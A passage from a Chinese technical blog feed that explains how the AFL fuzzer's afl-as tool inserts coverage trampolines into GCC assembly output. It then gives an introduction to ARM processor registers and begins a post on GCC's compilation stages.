class="keyword">if</span> (!inf) PFATAL(<span class="string">&quot;Unable to read &#x27;%s&#x27;&quot;</span>, input_file);</span><br><span class="line">  &#125; <span class="keyword">else</span> inf = <span class="built_in">stdin</span>;</span><br><span class="line">  outfd = open(modified_file, O_WRONLY | O_EXCL | O_CREAT, <span class="number">0600</span>);</span><br><span class="line">  <span class="keyword">if</span> (outfd &lt; <span class="number">0</span>) PFATAL(<span class="string">&quot;Unable to write to &#x27;%s&#x27;&quot;</span>, modified_file);</span><br><span class="line">  outf = fdopen(outfd, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!outf) PFATAL(<span class="string">&quot;fdopen() failed&quot;</span>);  </span><br><span class="line">  <span class="keyword">while</span> (fgets(line, MAX_LINE, inf)) &#123;</span><br><span class="line">    <span class="comment">/* In some cases, we want to defer writing the instrumentation trampoline</span></span><br><span class="line"><span class="comment">       until after all the labels, macros, comments, etc. If we&#x27;re in this</span></span><br><span class="line"><span class="comment">       mode, and if the line starts with a tab followed by a character, dump</span></span><br><span class="line"><span class="comment">       the trampoline now. */</span></span><br><span class="line">      <span class="comment">/*在某些情况下，我们希望推迟写入插装跳板，直到所有标签、宏、注释等处理完毕。</span></span><br><span class="line"><span class="comment">      如果我们处于这种模式，并且如果该行以制表符后跟字符开头，则立即输出跳板。*/</span></span><br><span class="line">    <span class="keyword">if</span> (!pass_thru &amp;&amp; !skip_intel &amp;&amp; !skip_app &amp;&amp; !skip_csect &amp;&amp; instr_ok &amp;&amp;</span><br><span class="line">        instrument_next &amp;&amp; line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span> &amp;&amp; <span class="built_in">isalpha</span>(line[<span class="number">1</span>])) &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">              R(MAP_SIZE));</span><br><span class="line">      instrument_next = <span class="number">0</span>;</span><br><span class="line">      ins_lines++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Output the actual line, call it a day in pass-thru mode. */</span></span><br><span class="line">    <span class="comment">/*在直通模式下，输出实际行并结束处理。*/</span></span><br><span class="line">    <span class="built_in">fputs</span>(line, outf);</span><br><span class="line">    <span class="keyword">if</span> (pass_thru) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="comment">/* All right, this is where the actual fun begins. For one, we only want to</span></span><br><span class="line"><span class="comment">       instrument the .text section. So, let&#x27;s keep track of that in processed</span></span><br><span class="line"><span class="comment">       files - and let&#x27;s set instr_ok accordingly. */</span></span><br><span class="line">    <span class="comment">/*好了，真正有趣的部分开始了。首先，我们只想对 .text 部分进行插装。</span></span><br><span class="line"><span class="comment">    因此，让我们在处理过的文件中跟踪这一点，并相应地设置 instr_ok*/</span></span><br><span class="line">    <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span> &amp;&amp; line[<span class="number">1</span>] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">      <span class="comment">/* OpenBSD puts jump tables directly inline with the code, which is</span></span><br><span class="line"><span class="comment">         a bit annoying. They use a specific format of p2align directives</span></span><br><span class="line"><span class="comment">         around them, so we use that as a signal. */</span></span><br><span class="line">        <span class="comment">/*OpenBSD 将跳转表直接内联到代码中，这有点让人烦恼。</span></span><br><span class="line"><span class="comment">        它们在跳转表周围使用了一种特定格式的 p2align 指令，因此我们将其作为信号来处理。*/</span></span><br><span class="line">      <span class="keyword">if</span> (!clang_mode &amp;&amp; instr_ok &amp;&amp; !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;p2align &quot;</span>, <span class="number">8</span>) &amp;&amp;</span><br><span class="line">          <span class="built_in">isdigit</span>(line[<span class="number">10</span>]) &amp;&amp; line[<span class="number">11</span>] == <span class="string">&#x27;\n&#x27;</span>) skip_next_label = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;text\n&quot;</span>, <span class="number">5</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t.text&quot;</span>, <span class="number">13</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t__TEXT,__text&quot;</span>, <span class="number">21</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section __TEXT,__text&quot;</span>, <span class="number">21</span>)) &#123;</span><br><span class="line">        instr_ok = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t&quot;</span>, <span class="number">8</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section &quot;</span>, <span class="number">8</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;bss\n&quot;</span>, <span class="number">4</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;data\n&quot;</span>, <span class="number">5</span>)) &#123;</span><br><span class="line">        instr_ok = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Detect off-flavor assembly (rare, happens in gdb). When this is</span></span><br><span class="line"><span class="comment">       encountered, we set skip_csect until the opposite directive is</span></span><br><span class="line"><span class="comment">       seen, and we do not instrument. */</span></span><br><span class="line">    <span class="comment">/*检测到不常见的汇编（比较罕见，发生在 gdb 中）。</span></span><br><span class="line"><span class="comment">    当遇到这种情况时，我们设置 skip_csect，直到看到相反的指令为止，并且我们不进行插装。*/</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.code&quot;</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.code32&quot;</span>)) skip_csect = use_64bit;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.code64&quot;</span>)) skip_csect = !use_64bit;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Detect syntax changes, as could happen with hand-written assembly.</span></span><br><span class="line"><span class="comment">       Skip Intel blocks, resume instrumentation when back to AT&amp;T. */</span></span><br><span class="line">    <span class="comment">/*检测语法变化，可能发生在手写的汇编中。跳过 Intel 格式的代码块，当返回到 AT&amp;T 格式时恢复插桩*/</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.intel_syntax&quot;</span>)) skip_intel = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.att_syntax&quot;</span>)) skip_intel = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/* Detect and skip ad-hoc __asm__ blocks, likewise skipping them. */</span></span><br><span class="line">    <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;#&#x27;</span> || line[<span class="number">1</span>] == <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;#APP&quot;</span>)) skip_app = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;#NO_APP&quot;</span>)) skip_app = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* If we&#x27;re in the right mood for instrumenting, check for function</span></span><br><span class="line"><span class="comment">       names or conditional labels. This is a bit messy, but in essence,</span></span><br><span class="line"><span class="comment">       we want to catch:</span></span><br><span class="line"><span class="comment">         ^main:      - function entry point (always instrumented)</span></span><br><span class="line"><span class="comment">         ^.L0:       - GCC branch label</span></span><br><span class="line"><span class="comment">         ^.LBB0_0:   - clang branch label (but only in clang mode)</span></span><br><span class="line"><span class="comment">         ^\tjnz foo  - conditional branches</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       ...but not:</span></span><br><span class="line"><span class="comment">         ^# BB#0:    - clang comments</span></span><br><span class="line"><span class="comment">         ^ # BB#0:   - ditto</span></span><br><span class="line"><span class="comment">         ^.Ltmp0:    - clang non-branch labels</span></span><br><span class="line"><span class="comment">         ^.LC0       - GCC non-branch labels</span></span><br><span class="line"><span class="comment">         ^.LBB0_0:   - ditto (when in GCC mode)</span></span><br><span class="line"><span class="comment">         ^\tjmp foo  - non-conditional jumps</span></span><br><span class="line"><span class="comment">       Additionally, clang and GCC on MacOS X follow a different convention</span></span><br><span class="line"><span class="comment">       with no leading dots on labels, hence the weird maze of #ifdefs</span></span><br><span class="line"><span class="comment">       later on.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (skip_intel || skip_app || skip_csect || !instr_ok ||</span><br><span class="line">        line[<span class="number">0</span>] == <span class="string">&#x27;#&#x27;</span> || line[<span class="number">0</span>] == <span class="string">&#x27; &#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="comment">/* Conditional branch instruction (jnz, etc). We append the instrumentation</span></span><br><span class="line"><span class="comment">       right after the branch (to instrument the not-taken path) and at the</span></span><br><span class="line"><span class="comment">       branch destination label (handled later on). */</span></span><br><span class="line">    <span class="comment">/*条件分支指令（如 jnz 等）。</span></span><br><span class="line"><span class="comment">    我们将插装代码追加到分支指令后面（以插装未被选择的路径），并且将插装代码插入到分支目标标签处（稍后处理）。*/</span></span><br><span class="line">    <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (line[<span class="number">1</span>] == <span class="string">&#x27;j&#x27;</span> &amp;&amp; line[<span class="number">2</span>] != <span class="string">&#x27;m&#x27;</span> &amp;&amp; R(<span class="number">100</span>) &lt; inst_ratio) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">                R(MAP_SIZE));</span><br><span class="line">        ins_lines++;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Label of some sort. This may be a branch destination, but we need to</span></span><br><span class="line"><span class="comment">       tread carefully and account for several different formatting</span></span><br><span class="line"><span class="comment">       conventions. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line">    <span class="comment">/* Apple: L&lt;whatever&gt;&lt;digit&gt;: */</span></span><br><span class="line">    <span class="keyword">if</span> ((colon_pos = <span class="built_in">strstr</span>(line, <span class="string">&quot;:&quot;</span>))) &#123;</span><br><span class="line">      <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;L&#x27;</span> &amp;&amp; <span class="built_in">isdigit</span>(*(colon_pos - <span class="number">1</span>))) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="comment">/* Everybody else: .L&lt;whatever&gt;: */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;:&quot;</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line">        <span class="comment">/* .L0: or LBB0_0: style jump destination */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line">        <span class="comment">/* Apple: L&lt;num&gt; / LBB&lt;num&gt; */</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">isdigit</span>(line[<span class="number">1</span>]) || (clang_mode &amp;&amp; !<span class="built_in">strncmp</span>(line, <span class="string">&quot;LBB&quot;</span>, <span class="number">3</span>)))</span><br><span class="line">            &amp;&amp; R(<span class="number">100</span>) &lt; inst_ratio) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">        <span class="comment">/* Apple: .L&lt;num&gt; / .LBB&lt;num&gt; */</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">isdigit</span>(line[<span class="number">2</span>]) || (clang_mode &amp;&amp; !<span class="built_in">strncmp</span>(line + <span class="number">1</span>, <span class="string">&quot;LBB&quot;</span>, <span class="number">3</span>)))</span><br><span class="line">            &amp;&amp; R(<span class="number">100</span>) &lt; inst_ratio) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line">          <span class="comment">/* An optimization is possible here by adding the code only if the</span></span><br><span class="line"><span class="comment">             label is mentioned in the code in contexts other than call / jmp.</span></span><br><span class="line"><span class="comment">             That said, this complicates the code by requiring two-pass</span></span><br><span class="line"><span class="comment">             processing (messy with stdin), and results in a speed gain</span></span><br><span class="line"><span class="comment">             typically under 10%, because compilers are generally pretty good</span></span><br><span class="line"><span class="comment">             about not generating spurious intra-function jumps.</span></span><br><span class="line"><span class="comment">             We use deferred output chiefly to avoid disrupting</span></span><br><span class="line"><span class="comment">             .Lfunc_begin0-style exception handling calculations (a problem on</span></span><br><span class="line"><span class="comment">             MacOS X). */</span></span><br><span class="line">          <span class="keyword">if</span> (!skip_next_label) instrument_next = <span class="number">1</span>; <span class="keyword">else</span> skip_next_label = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* Function label (always instrumented, deferred mode). */</span></span><br><span class="line">        instrument_next = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (ins_lines)</span><br><span class="line">    <span class="built_in">fputs</span>(use_64bit ? main_payload_64 : main_payload_32, outf);</span><br><span class="line">  <span class="keyword">if</span> (input_file) fclose(inf);</span><br><span class="line">  fclose(outf);</span><br><span class="line">  <span class="keyword">if</span> (!be_quiet) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!ins_lines) WARNF(<span class="string">&quot;No instrumentation targets found%s.&quot;</span>,</span><br><span class="line">                          pass_thru ? <span class="string">&quot; (pass-thru mode)&quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> OKF(<span class="string">&quot;Instrumented %u locations (%s-bit, %s mode, ratio %u%%).&quot;</span>,</span><br><span class="line">             ins_lines, use_64bit ? <span class="string">&quot;64&quot;</span> : <span class="string">&quot;32&quot;</span>,</span><br><span class="line">             getenv(<span class="string">&quot;AFL_HARDEN&quot;</span>) ? <span class="string">&quot;hardened&quot;</span> :</span><br><span class="line">             (sanitizer ? <span class="string">&quot;ASAN/MSAN&quot;</span> : <span class="string">&quot;non-hardened&quot;</span>),</span><br><span class="line">             inst_ratio);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>该函数就是对gcc生成的.s文件做了修改，也就是插桩，可以看到只对.text段进行插桩，在text段进行插桩之后，调用汇编器as，生成可执行文件。<br>我们来看一下gcc生成的.s文件（gcc使用-S选项即可）：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">	.file	<span class="string">&quot;test-instr.c&quot;</span></span><br><span class="line">	.text</span><br><span class="line">	.section	.rodata</span><br><span class="line">.LC0:</span><br><span class="line">	.<span class="built_in">string</span>	<span class="string">&quot;Hum?&quot;</span></span><br><span class="line">.LC1:</span><br><span class="line">	.<span class="built_in">string</span>	<span class="string">&quot;Looks like a zero to me!&quot;</span></span><br><span class="line">.LC2:</span><br><span class="line">	.<span class="built_in">string</span>	<span class="string">&quot;A non-zero value? How quaint!&quot;</span></span><br><span class="line">	.text</span><br><span class="line">	.globl	main</span><br><span class="line">	.type	main, @function</span><br><span class="line">main:</span><br><span class="line">.LFB6:</span><br><span class="line">	.cfi_startproc</span><br><span class="line">	endbr64</span><br><span class="line">	pushq	%rbp</span><br><span class="line">	.cfi_def_cfa_offset <span class="number">16</span></span><br><span class="line">	.cfi_offset <span class="number">6</span>, <span class="number">-16</span></span><br><span class="line">	movq	%rsp, %rbp</span><br><span class="line">	.cfi_def_cfa_register <span class="number">6</span></span><br><span class="line">	subq	$<span class="number">32</span>, %rsp</span><br><span class="line">	movl	%edi, <span class="number">-20</span>(%rbp)</span><br><span class="line">	movq	%rsi, <span class="number">-32</span>(%rbp)</span><br><span class="line">	movq	%fs:<span class="number">40</span>, %rax</span><br><span class="line">	movq	%rax, <span class="number">-8</span>(%rbp)</span><br><span class="line">	xorl	%eax, %eax</span><br><span class="line">	leaq	<span class="number">-16</span>(%rbp), %rax</span><br><span class="line">	movl	$<span class="number">8</span>, %edx</span><br><span class="line">	movq	%rax, %rsi</span><br><span class="line">	movl	$<span class="number">0</span>, %edi</span><br><span class="line">	call	read@PLT</span><br><span class="line">	testq	%rax, %rax</span><br><span class="line">	jg	.L2</span><br><span class="line">	leaq	.LC0(%rip), %rax</span><br><span class="line">	movq	%rax, %rdi</span><br><span class="line">	call	<span class="built_in">puts</span>@PLT</span><br><span class="line">	movl	$<span class="number">1</span>, %edi</span><br><span class="line">	call	<span class="built_in">exit</span>@PLT</span><br><span class="line">.L2:</span><br><span class="line">	movzbl	<span class="number">-16</span>(%rbp), %eax</span><br><span class="line">	cmpb	$<span class="number">48</span>, %al</span><br><span class="line">	jne	.L3</span><br><span class="line">	leaq	.LC1(%rip), %rax</span><br><span class="line">	movq	%rax, %rdi</span><br><span class="line">	call	<span class="built_in">puts</span>@PLT</span><br><span class="line">	jmp	.L4</span><br><span class="line">.L3:</span><br><span class="line">	leaq	.LC2(%rip), %rax</span><br><span class="line">	movq	%rax, %rdi</span><br><span class="line">	call	<span class="built_in">puts</span>@PLT</span><br><span class="line">.L4:</span><br><span class="line">	movl	$<span class="number">0</span>, %edi</span><br><span class="line">	call	<span class="built_in">exit</span>@PLT</span><br><span class="line">	.cfi_endproc</span><br><span class="line">.LFE6:</span><br><span class="line">	.size	main, .-main</span><br><span class="line">	.ident	<span class="string">&quot;GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0&quot;</span></span><br><span class="line">	.section	.note.GNU-<span class="built_in">stack</span>,<span class="string">&quot;&quot;</span>,@progbits</span><br><span class="line">	.section	.note.gnu.property,<span class="string">&quot;a&quot;</span></span><br><span class="line">	.align <span class="number">8</span></span><br><span class="line">	.<span class="type">long</span>	<span class="number">1f</span> - <span class="number">0f</span></span><br><span class="line">	.<span class="type">long</span>	<span class="number">4f</span> - <span class="number">1f</span></span><br><span class="line">	.<span class="type">long</span>	<span class="number">5</span></span><br><span class="line"><span class="number">0</span>:</span><br><span class="line">	.<span class="built_in">string</span>	<span class="string">&quot;GNU&quot;</span></span><br><span class="line"><span class="number">1</span>:</span><br><span class="line">	.align <span class="number">8</span></span><br><span class="line">	.<span class="type">long</span>	<span class="number">0xc0000002</span></span><br><span class="line">	.<span class="type">long</span>	<span class="number">3f</span> - <span class="number">2f</span></span><br><span class="line"><span class="number">2</span>:</span><br><span class="line">	.<span class="type">long</span>	<span class="number">0x3</span></span><br><span class="line"><span class="number">3</span>:</span><br><span class="line">	.align <span class="number">8</span></span><br><span class="line"><span class="number">4</span>:</span><br></pre></td></tr></table></figure></div>
<p>在插桩的时候，代码中体现：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (line[<span class="number">1</span>] == <span class="string">&#x27;j&#x27;</span> &amp;&amp; line[<span class="number">2</span>] != <span class="string">&#x27;m&#x27;</span> &amp;&amp; R(<span class="number">100</span>) &lt; inst_ratio) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">                R(MAP_SIZE));</span><br><span class="line">        ins_lines++;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure></div>
<p>不难看出，trampoline_fmt32和trampoline_fmt64是一个宏，这里直接添加到文件中去了，我们在<code>afl-as.h</code>文件中可以看到这两个宏：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> u8* trampoline_fmt_32 =</span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- AFL TRAMPOLINE (32-BIT) --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;.align 4\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;leal -16(%%esp), %%esp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl %%edi,  0(%%esp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl %%edx,  4(%%esp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl %%ecx,  8(%%esp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl %%eax, 12(%%esp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl $0x%08x, %%ecx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;call __afl_maybe_log\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl 12(%%esp), %%eax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl  8(%%esp), %%ecx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl  4(%%esp), %%edx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl  0(%%esp), %%edi\n&quot;</span></span><br><span class="line">  <span class="string">&quot;leal 16(%%esp), %%esp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- END --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> u8* trampoline_fmt_64 =</span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- AFL TRAMPOLINE (64-BIT) --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;.align 4\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;leaq -(128+24)(%%rsp), %%rsp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rdx,  0(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rcx,  8(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rax, 16(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq $0x%08x, %%rcx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;call __afl_maybe_log\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq 16(%%rsp), %%rax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq  8(%%rsp), %%rcx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq  0(%%rsp), %%rdx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;leaq (128+24)(%%rsp), %%rsp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- END --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure></div>
<p>不难看出，这里的插桩就是让程序去调用函数<code>__afl_maybe_log</code>函数。<br>我们直接使用<code>afl-gcc</code>插桩生成一个文件（这里使用的是AFL项目中自带的test文件），去看一下afl_maybe_log函数：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic1.imgdb.cn/item/67a70eadd0e0a243d4fd032e.png"
                      alt="2-2-1 _afl_maybe_log.png"
                ><br>这里实际上只是<code>afl_maybe_log</code>函数的第一部分，也就是我们前面讲AFL原理的时候的<code>fork_server</code>。我们来看看第二部分，这部分就是我们前面讲过的路径信息反馈部分；<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic1.imgdb.cn/item/67a70eadd0e0a243d4fd032f.png"
                      alt="2-2-2 路径信息反馈.png"
                ><br>这里路径信息反馈的实现的原理是：在每个路径下都有一个唯一的id，实际上就是随机数，将该id作为下标，以共享内存基址作为基准，下标位置数据+1，就完成了路径信息反馈。</p>
]]></content>
      <categories>
        <category>AFL源码分析</category>
      </categories>
      <tags>
        <tag>二进制漏洞挖掘</tag>
        <tag>AFL源码分析</tag>
      </tags>
  </entry>
  <entry>
    <title>ARM寄存器简介</title>
    <url>/2025/03/12/ARM%E5%AF%84%E5%AD%98%E5%99%A8%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<h1 id="一-数据类型"><a href="#一-数据类型" class="headerlink" title="一.数据类型"></a>一.数据类型</h1><p>arm处理器支持一下几种数据类型：</p>
<ul>
<li>字节：8位</li>
<li>半字：16位</li>
<li>字：32位<br><strong>Load&#x2F;Store操作可以传送字节，半字和字，Load字节和半字数据时可以自动进行0扩展（unsigned类型）或符号扩展（signed类型）将其扩展为字。</strong><br><strong>所有数据运算操作，都按字宽度进行。</strong><br><strong>arm指令固定长度为32位，Thumb指令长度固定为16位。</strong></li>
</ul>
<h2 id="二-寄存器组织"><a href="#二-寄存器组织" class="headerlink" title="二.寄存器组织"></a>二.寄存器组织</h2><p>arm处理器共有37个寄存器包括31个通用寄存器和六个状态寄存器每个寄存器都是32位的但状态寄存器只用了其中的部分位。<br>寄存器R0<del>R7，在所有处理器模式下都只对应一个物理寄存器，称为未备份寄存器，未备份寄存器没有被系统用于任何特殊目的。<br>计算器R0</del>R12称为备份寄存器。每个寄存器对应两个物理寄存器，分别用R8<del>R12和R8_fiq</del>RF12_fiq表示，在快速状态模式使用R8_fiq到F12_fiq，在其他处理器模式中使用R8<del>R12。也就是说，在快速中断模式下，指令中的R8寄存器实际上是R8_fiq物理寄存器。这些寄存器也被系统用于特殊目的，只是当中断处理比较简单，仅仅使用R8_fiq到R14_fiq时，快速中断处理程序可以不必执行保存和恢复现场的指令，从而使中断处理器过程非常迅速。<br>寄存器R13</del>R14也被称为备份寄存器。但每个计算器对应6个物理寄存器，在用户模式和系统模式下共用一个物理寄存器，其他5种异常模式下分别使用另外五个物理寄存器。<br>寄存器R13在ARM中常用作堆栈指针，指令中常用SP，表示每一种异常模式都拥有自己的物理R13，应用程序在开始阶段初始化该R13，使其指向该异常模式专用的堆栈地址，当进入各一场模式时可以将需要使用的寄存器的值保存在R13所指的堆栈，中当退出异常处理程序时将保存在R13所指堆栈中的寄存器值弹出，这样就使异常处理程序不会破坏被其中断的应用程序的现场。<br>寄存器R14在ARM中被称为连接寄存器（LR）主要有如下两个作用：<br>&lt;1&gt;. 在每一种处理器模式中当通过<code>BL</code>或<code>BLX</code>指令调用子程序时，各模式对应的物理R14被设置成该子程序的返回地址，因此可以通过指令mov PC，LR来实现子程序的返回操作。<br>&lt;2&gt;. 当异常发生时该异常模式对应的物理R14被设置成该异常模式将由返回的地址。<br>计算器R15不是备份寄存器，在所有处理器模式下都只对应一个物理寄存器R15寄存器在arm中被称为程序计数器（PC），用来指出当前CPU执行的指令地址，由于arm采用流水线机制，一般PC指向当前指令后的两条指令的地址，即PC值为当前指令加八个字节。向R15寄存器中写入一个地址值就可以实现程序的跳转。<br><strong>上述R0<del>R15及部分备份寄存器共31个称为通用寄存器，即在程序中可以任意使用。但不建议把R13</del>R15当做通用寄存器来使用。</strong><br>寄存器CPSR称为当前程序状态寄存器，在所有模式下都只对应一个物理寄存器，不用户模式只能对它进行读操作外，其他处理器模式都可以对它进行完全的读写操作。</p>
]]></content>
      <categories>
        <category>嵌入式系统应用</category>
      </categories>
      <tags>
        <tag>嵌入式系统应用</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux C语言编程工具</title>
    <url>/2025/03/11/Linux%20C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<h1 id="一-GCC"><a href="#一-GCC" class="headerlink" title="一.GCC"></a>一.GCC</h1><p>GCC是GUN开源社区的一个编译器项目，最初只能编译C语言程序，随着众多开源爱好者对GCC功能的不断完善，如今，GCC已经能完成对多种编程语言编写的程序编译，包括C、C++、Ada、Object C、Java、Fortran等。<br>GCC不仅能够编译多种语言的程序，而且具有交叉编译的功能。<br><strong>在嵌入式系统开发中，经常利用GCC的交叉编译功能，在上位机中生成下位机中的可执行代码。</strong><br>使用GCC产生的可执行代码效率要比其他编译器所产生的可执行代码的执行效率平均提高20%~30%。<br>GCC将源代码程序转变为可执行程序的过程分为4个相互关联的步骤：预处理，编译，汇编和链接。</p>
<ul>
<li>预处理：对源代码文件中的包含（<code>include</code>）语句，预处理语句（<code>define</code>等）进行宏替换</li>
<li>编译：调用ccl进行编译，生成.o为后缀的目标文件</li>
<li>汇编：汇编过程是针对源代码中汇编语言代码的步骤，调用as将以<code>.s</code>和<code>.S</code>为后缀的汇编语言源代码文件进行和生成以<code>.o</code>为后缀的目标文件</li>
